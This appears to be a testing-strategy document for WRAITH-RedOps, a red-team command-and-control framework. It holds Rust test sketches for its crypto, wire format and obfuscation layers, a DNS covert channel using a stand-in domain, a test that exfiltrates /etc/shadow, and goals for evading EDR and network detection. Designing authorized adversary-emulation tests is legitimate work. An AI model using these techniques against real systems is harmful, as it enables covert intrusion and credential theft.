# WRAITH-RedOps Testing Strategy

**Document Version:** 1.1.0
**Last Updated:** 2025-11-29
**Classification:** Reference Architecture
**Governance:** See [Security Testing Parameters](../../../ref-docs/WRAITH-Security-Testing-Parameters-v1.0.md)

---

## 1. Overview
This document outlines the comprehensive validation strategy for the WRAITH-RedOps platform. Testing focuses on **protocol correctness**, **cryptographic security**, **operational stability**, **stealth/evasion effectiveness**, and **governance safety**.

### 1.1 Testing Scope

**Protocol Stack Validation:**
- wraith-core: Frame construction, session management, stream multiplexing
- wraith-crypto: Noise_XX handshake, AEAD encryption, key ratcheting
- wraith-transport: AF_XDP, io_uring, UDP, TCP, covert channels
- wraith-obfuscation: Padding, timing, protocol mimicry
- wraith-discovery: DHT integration, relay coordination
- wraith-files: Chunking, integrity verification, compression

**Integration Testing:**
- End-to-end C2 channel establishment
- Multi-transport failover scenarios
- P2P beacon mesh topology
- Data exfiltration reliability
- Evasion effectiveness validation

**Security Verification:**
- Cryptographic primitive correctness
- Forward secrecy mechanisms
- Replay attack resistance
- Traffic analysis resistance

---

## 2. Cryptographic Verification Tests

### 2.1 Noise_XX Handshake Protocol

**Test Objective:** Verify correct implementation of Noise_XX handshake for C2 channel establishment.

**Test Cases:**

**TC-CRYPTO-001: Successful Three-Phase Handshake**
```rust
#[test]
fn test_noise_xx_handshake_success() {
    // Beacon (initiator) setup
    let (beacon_static, _) = generate_elligator_keypair();
    let mut beacon_handshake = NoiseHandshake::initiator(beacon_static);

    // Server (responder) setup
    let (server_static, _) = generate_elligator_keypair();
    let mut server_handshake = NoiseHandshake::responder(server_static);

    // Phase 1: Beacon → Server
    let phase1_msg = beacon_handshake.write_message(&[]).unwrap();
    assert_eq!(phase1_msg.len(), 96);  // Expected size
    assert_eq!(&phase1_msg[0..8], &[0xFF; 8]);  // Special CID
    server_handshake.read_message(&phase1_msg).unwrap();

    // Phase 2: Server → Beacon
    let phase2_msg = server_handshake.write_message(&[]).unwrap();
    assert_eq!(phase2_msg.len(), 128);
    beacon_handshake.read_message(&phase2_msg).unwrap();

    // Phase 3: Beacon → Server
    let phase3_msg = beacon_handshake.write_message(&[]).unwrap();
    assert_eq!(phase3_msg.len(), 80);
    server_handshake.read_message(&phase3_msg).unwrap();

    // Verify both parties derive identical transport keys
    let (beacon_send, beacon_recv) = beacon_handshake.into_transport_mode().unwrap();
    let (server_send, server_recv) = server_handshake.into_transport_mode().unwrap();

    assert_eq!(beacon_send.key(), server_recv.key());
    assert_eq!(beacon_recv.key(), server_send.key());
}
```

**TC-CRYPTO-002: Elligator2 Encoding Success Rate**
```rust
#[test]
fn test_elligator2_encoding_success_rate() {
    let attempts = 1000;
    let mut successes = 0;

    for _ in 0..attempts {
        if let Ok((_, repr)) = generate_elligator_keypair() {
            successes += 1;
            // Verify representative looks random
            assert!(repr[31] & 0x80 == 0 || repr[31] & 0x80 == 0x80);  // High bit randomized
        }
    }

    let success_rate = successes as f64 / attempts as f64;
    assert!(success_rate >= 0.45 && success_rate <= 0.55);  // ~50% expected
}
```

**TC-CRYPTO-003: Handshake Replay Attack Resistance**
```rust
#[test]
fn test_handshake_replay_resistance() {
    // Capture legitimate handshake
    let phase1_msg = perform_phase1();
    let phase2_msg = perform_phase2(&phase1_msg);

    // Attempt to replay phase 1 message
    let result = server_handshake.read_message(&phase1_msg);
    assert!(result.is_err());  // Should reject duplicate

    // Attempt to replay phase 2 message
    let result = beacon_handshake.read_message(&phase2_msg);
    assert!(result.is_err());  // Should reject duplicate
}
```

### 2.2 AEAD Encryption Verification

**TC-CRYPTO-004: XChaCha20-Poly1305 Test Vectors**
```rust
#[test]
fn test_xchacha20_poly1305_correctness() {
    // RFC test vectors
    let key = hex::decode("808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9f").unwrap();
    let nonce = hex::decode("404142434445464748494a4b4c4d4e4f5051525354555657").unwrap();
    let plaintext = b"Ladies and Gentlemen of the class of '99: If I could offer you only one tip for the future, sunscreen would be it.";
    let aad = hex::decode("50515253c0c1c2c3c4c5c6c7").unwrap();

    let cipher = XChaCha20Poly1305::new(&key);
    let ciphertext = cipher.encrypt(&nonce, plaintext.as_ref(), &aad).unwrap();

    // Verify encryption produces expected ciphertext
    let expected_ciphertext = hex::decode("...");  // From RFC
    assert_eq!(ciphertext, expected_ciphertext);

    // Verify decryption recovers plaintext
    let decrypted = cipher.decrypt(&nonce, &ciphertext, &aad).unwrap();
    assert_eq!(decrypted, plaintext);
}
```

**TC-CRYPTO-005: Nonce Uniqueness Enforcement**
```rust
#[test]
fn test_nonce_uniqueness() {
    let mut session = Session::new(beacon_id, keypair);
    let mut seen_nonces = HashSet::new();

    // Send 10,000 frames
    for _ in 0..10_000 {
        let frame = session.create_frame(FrameType::PAD, &[]);
        let nonce = extract_nonce(&frame);

        assert!(!seen_nonces.contains(&nonce), "Nonce reused!");
        seen_nonces.insert(nonce);
    }
}
```

### 2.3 Key Ratcheting Verification

**TC-CRYPTO-006: Symmetric Ratchet Forward Secrecy**
```rust
#[test]
fn test_symmetric_ratchet_forward_secrecy() {
    let mut session = Session::new(beacon_id, keypair);

    // Send packet, capture message key
    let frame1 = session.send_frame(test_frame())?;
    let msg_key1 = session.get_last_message_key();  // Test accessor

    // Send another packet
    let frame2 = session.send_frame(test_frame())?;
    let msg_key2 = session.get_last_message_key();

    // Verify keys are different
    assert_ne!(msg_key1, msg_key2);

    // Verify old key is zeroized (memory inspection)
    assert!(is_zeroized(&msg_key1));
}
```

**TC-CRYPTO-007: DH Ratchet Trigger Conditions**
```rust
#[test]
fn test_dh_ratchet_time_trigger() {
    let mut session = Session::new(beacon_id, keypair);
    let start_time = Instant::now();

    // Fast-forward time by 2 minutes
    session.set_time_offset(Duration::from_secs(120));

    // Next frame should trigger REKEY
    let frame = session.send_frame(test_frame())?;
    assert_eq!(frame.frame_type, FrameType::REKEY);
}

#[test]
fn test_dh_ratchet_volume_trigger() {
    let mut session = Session::new(beacon_id, keypair);

    // Send 1,000,000 frames
    for _ in 0..1_000_000 {
        session.send_frame(test_frame())?;
    }

    // Next frame should trigger REKEY
    let frame = session.send_frame(test_frame())?;
    assert_eq!(frame.frame_type, FrameType::REKEY);
}
```

---

## 3. Wire Format Validation Tests

### 3.1 Frame Construction Correctness

**TC-WIRE-001: Outer Packet Structure**
```rust
#[test]
fn test_outer_packet_format() {
    let session = Session::new(beacon_id, keypair);
    let frame = session.send_frame(test_data_frame())?;

    // Verify CID (8 bytes)
    assert_eq!(frame[0..8].len(), 8);
    let cid = u64::from_be_bytes(frame[0..8].try_into().unwrap());
    assert_ne!(cid, 0);
    assert_ne!(cid, 0xFFFFFFFFFFFFFFFF);

    // Verify auth tag (last 16 bytes)
    let tag = &frame[frame.len()-16..];
    assert_eq!(tag.len(), 16);

    // Verify encrypted payload exists
    let payload_len = frame.len() - 8 - 16;
    assert!(payload_len >= 28);  // At least header size
}
```

**TC-WIRE-002: Inner Frame Header Parsing**
```rust
#[test]
fn test_inner_frame_header() {
    let frame = create_test_frame(FrameType::DATA, stream_id: 1, seq: 42);

    // Decrypt to get inner frame
    let plaintext = decrypt_frame(&frame)?;

    // Parse header fields
    assert_eq!(plaintext[0..8], nonce_bytes);  // Nonce
    assert_eq!(plaintext[8], 0x01);  // Frame type (DATA)
    assert_eq!(plaintext[9], 0x00);  // Flags
    assert_eq!(u16::from_be_bytes([plaintext[10], plaintext[11]]), 1);  // Stream ID
    assert_eq!(u32::from_be_bytes(plaintext[12..16].try_into().unwrap()), 42);  // Seq num
}
```

### 3.2 C2 Channel Reliability Tests

**TC-WIRE-003: Ordered Delivery with Loss**
```rust
#[test]
fn test_ordered_delivery_with_packet_loss() {
    let mut server_session = Session::new(server_id, server_keypair);
    let mut beacon_session = Session::new(beacon_id, beacon_keypair);

    // Beacon sends 100 frames
    let mut frames = Vec::new();
    for seq in 0..100 {
        frames.push(beacon_session.send_frame(data_frame(seq))?);
    }

    // Simulate 10% packet loss (drop random frames)
    let mut received = frames.clone();
    received.retain(|_| rand::random::<f64>() > 0.1);

    // Server receives out-of-order
    received.shuffle(&mut rand::thread_rng());

    // Server should reorder and detect gaps
    for frame in received {
        server_session.receive_frame(&frame)?;
    }

    // Server should identify missing frames
    let missing = server_session.get_missing_sequences();
    assert!(missing.len() <= 10);  // Approximately 10% loss

    // Server requests retransmission
    let ack_frame = server_session.create_ack_frame()?;
    assert_eq!(ack_frame.frame_type, FrameType::ACK);
}
```

**TC-WIRE-004: Stream Multiplexing**
```rust
#[test]
fn test_stream_multiplexing() {
    let mut session = Session::new(beacon_id, keypair);

    // Open 3 streams: command, file transfer, SOCKS
    let cmd_stream = session.open_stream(StreamType::Unidirectional)?;
    let file_stream = session.open_stream(StreamType::Unidirectional)?;
    let socks_stream = session.open_stream(StreamType::Bidirectional)?;

    // Send interleaved frames
    session.send_frame(Frame { stream_id: cmd_stream, ..test_frame() })?;
    session.send_frame(Frame { stream_id: file_stream, ..test_frame() })?;
    session.send_frame(Frame { stream_id: cmd_stream, ..test_frame() })?;
    session.send_frame(Frame { stream_id: socks_stream, ..test_frame() })?;

    // Verify frames route to correct stream buffers
    assert_eq!(session.get_stream_data(cmd_stream)?.len(), 2);
    assert_eq!(session.get_stream_data(file_stream)?.len(), 1);
    assert_eq!(session.get_stream_data(socks_stream)?.len(), 1);
}
```

---

## 4. Obfuscation Effectiveness Tests

### 4.1 Padding Distribution Analysis

**TC-OBFS-001: Padding Class Distribution**
```rust
#[test]
fn test_padding_class_distribution() {
    let mut obfuscator = Obfuscator::new(PaddingMode::Privacy);
    let mut sizes = HashMap::new();

    // Send 10,000 frames
    for _ in 0..10_000 {
        let frame = obfuscator.wrap_frame(test_frame())?;
        *sizes.entry(frame.len()).or_insert(0) += 1;
    }

    // Verify distribution across padding classes
    assert!(sizes.contains_key(&64));    // Tiny
    assert!(sizes.contains_key(&256));   // Small
    assert!(sizes.contains_key(&512));   // Medium
    assert!(sizes.contains_key(&1024));  // Large
    assert!(sizes.contains_key(&1472));  // MTU

    // Chi-square test for uniform distribution
    let chi_square = calculate_chi_square(&sizes);
    assert!(chi_square < 11.07);  // 95% confidence, df=4
}
```

**TC-OBFS-002: Timing Jitter Verification**
```rust
#[test]
fn test_timing_jitter_exponential_distribution() {
    let timing_config = TimingMode::HighPrivacy(jitter_percent: 30);
    let mut delays = Vec::new();

    // Measure 1000 inter-packet delays
    for _ in 0..1000 {
        delays.push(calculate_send_delay(timing_config).as_millis());
    }

    // Verify exponential distribution (Kolmogorov-Smirnov test)
    let ks_statistic = ks_test_exponential(&delays, lambda: 200.0);
    assert!(ks_statistic < 0.043);  // 95% confidence
}
```

### 4.2 Protocol Mimicry Validation

**TC-OBFS-003: TLS 1.3 Traffic Fingerprinting**
```rust
#[test]
fn test_tls13_mimicry_ja3_fingerprint() {
    let mimicry = MimicryProfile::Tls13Chrome;
    let wrapped_frame = mimicry.wrap(test_frame())?;

    // Parse TLS record
    assert_eq!(wrapped_frame[0], 0x17);  // Application Data
    assert_eq!(wrapped_frame[1..3], [0x03, 0x03]);  // TLS 1.2 (legacy)

    // Extract JA3 fingerprint from ClientHello
    let ja3 = extract_ja3_fingerprint(&wrapped_frame);
    let expected_chrome_ja3 = "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,29-23-24,0";

    assert_eq!(ja3, expected_chrome_ja3);
}
```

**TC-OBFS-004: DNS Covert Channel Encoding**
```rust
#[test]
fn test_dns_covert_channel_encoding() {
    let covert_channel = CovertChannel::Dns;
    let payload = b"WRAITH C2 TASK DATA";

    // Encode in DNS query
    let dns_query = covert_channel.encode(payload)?;

    // Verify DNS structure
    assert_eq!(dns_query.question_count(), 1);
    let qname = dns_query.questions()[0].qname();
    assert!(qname.ends_with(b".tunnel.example.com"));

    // Verify base32 encoding
    let encoded_data = extract_subdomain(&qname);
    let decoded = base32::decode(encoded_data)?;
    assert_eq!(decoded, payload);
}
```

---

## 5. Transport Layer Tests

### 5.1 AF_XDP Performance Validation

**TC-TRANSPORT-001: Zero-Copy Packet Processing**
```rust
#[cfg(target_os = "linux")]
#[test]
fn test_af_xdp_zero_copy() {
    let mut xdp_transport = AfXdpTransport::new("eth0", umem_size: 4096)?;

    // Send packet through AF_XDP
    let frame = test_frame();
    let umem_addr = xdp_transport.send_to(&frame, server_addr)?;

    // Verify packet was placed in UMEM (no memcpy)
    assert_eq!(xdp_transport.get_umem_data(umem_addr), frame);

    // Verify TX completion queue processed packet
    let completions = xdp_transport.poll_completions(timeout: 100ms)?;
    assert!(completions.contains(&umem_addr));
}
```

**TC-TRANSPORT-002: Multi-Transport Failover**
```rust
#[test]
fn test_transport_failover_udp_to_relay() {
    let mut beacon = Beacon::new(beacon_id, keypair);
    beacon.set_transports(vec![
        Transport::Udp(server_addr),
        Transport::Relay(relay_addr),
        Transport::DnsCovert(dns_server),
    ]);

    // Simulate UDP failure (network unreachable)
    mock_network::block_udp();

    // Beacon should automatically fail over to relay
    beacon.checkin()?;

    // Verify beacon used relay
    let transport_log = beacon.get_transport_log();
    assert_eq!(transport_log.last().unwrap().transport_type, "relay");
}
```

---

## 6. Adversary Emulation Test Scenarios

### 6.1 MITRE ATT&CK Technique Validation

**TC-ATTACK-001: T1071.001 (Application Layer Protocol: Web Protocols)**
```rust
#[test]
fn test_attack_t1071_001_https_c2() {
    // Beacon uses HTTPS mimicry for C2
    let beacon = Beacon::new_with_transport(Transport::Https);
    beacon.checkin()?;

    // Verify C2 traffic appears as legitimate HTTPS
    let pcap = capture_traffic(duration: 5s);
    let tls_sessions = extract_tls_sessions(&pcap);

    assert!(tls_sessions.len() > 0);
    assert!(all_sessions_valid_tls(&tls_sessions));
}
```

**TC-ATTACK-002: T1041 (Exfiltration Over C2 Channel)**
```rust
#[test]
fn test_attack_t1041_exfiltration() {
    let beacon = Beacon::new(beacon_id, keypair);
    let sensitive_file = read_target_file("/etc/shadow")?;

    // Exfiltrate over C2 channel
    beacon.exfiltrate_file(&sensitive_file)?;

    // Verify file chunks transmitted via C2
    let server_logs = get_server_logs();
    assert!(server_logs.contains_exfiltration_event(beacon_id));

    // Verify file integrity at server
    let reassembled = server.get_exfiltrated_file(beacon_id, file_id)?;
    assert_eq!(BLAKE3::hash(&reassembled), BLAKE3::hash(&sensitive_file));
}
```

**TC-ATTACK-003: T1090 (Proxy: Multi-hop Proxy)**
```rust
#[test]
fn test_attack_t1090_multihop_proxy() {
    // Setup P2P beacon mesh: Gateway → Internal A → Internal B
    let gateway = Beacon::new_gateway(external_ip);
    let beacon_a = Beacon::new_p2p_child(gateway.id());
    let beacon_b = Beacon::new_p2p_child(beacon_a.id());

    // Command should route: Server → Gateway → A → B
    let task = Task::shell("whoami");
    server.send_task(beacon_b.id(), task)?;

    // Verify routing path
    let route = server.get_task_route(task.id())?;
    assert_eq!(route, vec![gateway.id(), beacon_a.id(), beacon_b.id()]);

    // Verify result returned
    let result = server.wait_for_result(task.id(), timeout: 30s)?;
    assert!(result.output.contains("target_user"));
}
```

---

## 7. Unit Testing (Rust)

### 7.1 Implant Logic (`no_std`)
*   **Goal:** Ensure core logic works without OS dependencies.
*   **Tool:** `cargo test` with custom runner for freestanding targets.
*   **Scope:**
    *   Protocol serialization/deserialization (PDU).
    *   Crypto primitives (XChaCha20-Poly1305, Noise_XX Handshake).
    *   Command dispatching logic.
    *   WRAITH frame parsing and construction.

### 7.2 Team Server Logic
*   **Goal:** Verify state management and concurrency.
*   **Scope:**
    *   Database transactions (Task queuing, Result processing).
    *   Listener Bus routing (ensure packets go to correct session).
    *   Builder pipeline (verify artifact generation outputs valid PE files).
    *   WRAITH protocol stack integration (session, crypto, transport).

---

## 8. Integration Testing (Lab Environment)

### 8.1 End-to-End Connectivity
*   **Setup:** 
    *   Team Server (Ubuntu).
    *   Target VM (Windows 10).
*   **Procedure:**
    1.  Generate payload.
    2.  Execute on Target.
    3.  Verify "New Beacon" event on Server.
    4.  Task `whoami`.
    5.  Verify output received via WRAITH C2 channel.

### 8.2 Governance Verification
*   **Goal:** Ensure "Scope Lock" works.
*   **Procedure:**
    1.  Compile implant with Allowed CIDR `10.0.0.0/24`.
    2.  Deploy on `192.168.1.50` (Out of Scope).
    3.  Assert: Implant refuses to run or terminates immediately.
    4.  Task implant to `portscan 8.8.8.8` (Out of Scope).
    5.  Assert: Task rejected by Implant Kernel.

---

## 9. Adversary Simulation (Purple Team)

### 9.1 Evasion Testing (vs EDR)
*   **Goal:** Verify Sleep Mask and Syscalls bypass detection.
*   **Environment:** Lab with Defender for Endpoint, CrowdStrike, or SentinelOne (Trial).
*   **Metrics:**
    *   **Static Detection:** Does the file get eaten on disk? (Test Obfuscator).
    *   **Dynamic Detection:** Does `shell whoami` trigger an alert?
    *   **Memory Scanning:** run `pe-sieve` against the beacon process while it is sleeping. Assert: No malicious patterns found.

### 9.2 Network Stealth (WRAITH Protocol Analysis)
*   **Goal:** Verify C2 traffic blends in.
*   **Tool:** RITA (Real Intelligence Threat Analytics) / Zeek.
*   **Procedure:**
    1.  Run beacon for 24 hours with `jitter = 20%`.
    2.  Analyze PCAPs with RITA / Zeek.
    3.  Assert: Beacon score is low (< 0.5), C2 traffic indistinguishable from benign.
    4.  Verify Elligator2 encoding makes handshakes appear as random bytes.
    5.  Verify protocol mimicry (TLS/DNS/ICMP) passes DPI inspection.

---

## 10. CI/CD Pipeline

*   **Build:** Cross-compile Implant (Windows/Linux) and Server.
*   **Test:** Run Unit Tests.
*   **Safety Check:** Verify Governance module cannot be disabled via simple flag.
*   **Release:** Sign binaries with dev key.
